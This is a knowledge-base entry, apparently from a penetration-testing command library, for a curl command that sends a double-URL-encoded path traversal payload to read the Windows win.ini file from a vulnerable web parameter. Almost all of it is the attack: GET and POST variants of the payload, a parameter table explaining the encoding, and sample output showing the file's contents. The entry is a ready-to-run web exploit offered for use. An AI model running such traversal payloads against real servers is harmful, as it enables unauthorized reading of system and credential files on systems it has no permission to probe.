---
type: command
executor: bash
data: >-
  curl
  "http://target.com/vulnerable?file=%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin%252eini"
  -v
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - macOS
tags:
  - web
  - exploitation
  - traversal
verified: true
validated: true
---

# curl-double-encoded-traversal-to-win-ini

## Command

```bash
curl "http://target.com/vulnerable?file=%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin%252eini" -v
```

## Description

This curl command sends an HTTP GET request with a double URL encoded directory traversal payload to access the Windows win.ini file, exploiting vulnerabilities like path traversal in web parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| http://target.com/vulnerable | The vulnerable endpoint URL | Yes |
| ?file= | The parameter name for the path (adjust based on app) | Yes |
| %252e%252e%255c... | Double-encoded traversal to C:\Windows\win.ini | Yes |
| -v | Verbose output to show request/response details | No |

## Examples

### Basic Usage

```bash
curl "http://target.com/vulnerable?file=%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin%252eini" -v
```

### Advanced Usage

For POST requests:

```bash
curl -X POST "http://target.com/vulnerable" -d "file=%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin%252eini" -v
```

## Expected Output

HTTP/1.1 200 OK

; for 16-bit app support

[fonts]

[extensions]

[files]

## Related

- [[procedures/Exploit-Directory-Traversal-with-Double-URL-Encoding]]
- [[commands/double-url-encode-traversal-path]]
